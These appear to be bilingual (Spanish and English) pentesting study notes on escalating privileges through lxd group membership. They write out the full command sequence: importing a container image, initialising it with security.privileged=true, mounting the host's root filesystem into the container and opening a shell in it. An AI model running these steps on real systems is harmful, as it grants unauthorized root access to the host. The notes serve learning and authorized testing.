
Comprobamos con `id` si estamos en el grupo lxc o lxd:
```shell-session

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```


Si vemos un directorio o algo que contenga imágenes lo listamos y importamos la imagen:
````shell-session
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
````

Podemos listar las imágenes:
```shell-session
lxc image list
```


After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host:

Creamos un contenedor "privesc" a partir de la imagen ubuntu temp, seteando la flag security.privileged a true, la cuál nos permite actuar sobre el host.
```shell-session
lxc init ubuntutemp privesc -c security.privileged=true
```

Añadimos al contenedor todo el disco raíz del host y lo montamos en /mnt/root de la imagen.

```shell

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```


Ahora podemos iniciar el contenedor y acceder a el, en /mnt/root tenemos todo el sistema de directorios raiz del host. Podremos modificarlos y modificaremos lo del host.
1. Iniciamos el contenedor :
	`lxc start privesc`
2. Ejecutamos una tty: 
	`lxc exec privesc /bin/bash` -> si no funciona probar con /bin/sh
3. Listamos la montura /mnt/root y veremos que está todo el sistema de archivos del host.

